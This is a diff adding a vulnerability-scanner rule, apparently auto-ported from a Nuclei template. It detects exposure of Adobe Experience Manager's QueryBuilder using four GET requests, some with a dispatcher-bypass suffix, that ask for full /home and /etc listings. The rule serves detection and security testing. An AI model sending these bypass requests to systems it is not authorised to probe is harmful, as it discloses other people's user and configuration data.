@@ -1,0 +1,53 @@
+schema_version: 1
+id: "cortex.community:aem-querybuilder-internal-path-read"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "AEM QueryBuilder Internal Path Read"
+  description: "AEM QueryBuilder is vulnerable to LFI. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://speakerdeck.com/0ang3el/aem-hacker-approaching-adobe-experience-manager-webapps-in-bug-bounty-programs?slide=91"
+  cwes: [22]
+  tags: ["aem", "misconfig", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "Medium"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/bin/querybuilder.json.;%0aa.css?path=/home&p.hits=full&p.limit=-1" }
+  - id: "probe1"
+    request: { method: "GET", path: "/bin/querybuilder.json.;%0aa.css?path=/etc&p.hits=full&p.limit=-1" }
+  - id: "probe2"
+    request: { method: "GET", path: "/bin/querybuilder.json.css?path=/home&p.hits=full&p.limit=-1" }
+  - id: "probe3"
+    request: { method: "GET", path: "/bin/querybuilder.json.css?path=/etc&p.hits=full&p.limit=-1" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    any:
+      - all:
+          - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
+          - all:
+              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "jcr:path" } }
+              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "success" } }
+      - all:
+          - eq: { left: { ref: "steps.probe1.status" }, right: { value: 200 } }
+          - all:
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "jcr:path" } }
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "success" } }
+      - all:
+          - eq: { left: { ref: "steps.probe2.status" }, right: { value: 200 } }
+          - all:
+              - contains: { left: { ref: "steps.probe2.body" }, right: { value: "jcr:path" } }
+              - contains: { left: { ref: "steps.probe2.body" }, right: { value: "success" } }
+      - all:
+          - eq: { left: { ref: "steps.probe3.status" }, right: { value: 200 } }
+          - all:
+              - contains: { left: { ref: "steps.probe3.body" }, right: { value: "jcr:path" } }
+              - contains: { left: { ref: "steps.probe3.body" }, right: { value: "success" } }
